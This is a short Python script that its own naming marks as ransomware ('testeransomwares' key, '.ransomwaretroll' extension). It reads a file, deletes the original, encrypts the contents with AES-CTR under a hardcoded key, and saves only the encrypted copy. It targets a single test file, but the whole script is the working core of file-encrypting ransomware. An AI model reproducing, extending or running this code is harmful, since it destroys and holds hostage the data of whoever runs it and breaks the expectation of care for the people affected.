import os
import pyaes

# open file

file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# remove opened file

os.remove(file_name)

# encrypt key

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# encrypt file

crypto_data = aes.encrypt(file_data)

# save encrypted file

new_file = file_name + ".ransomwaretroll"
new_file = open(f"{new_file}", "wb")
new_file.write(crypto_data)
new_file.close()
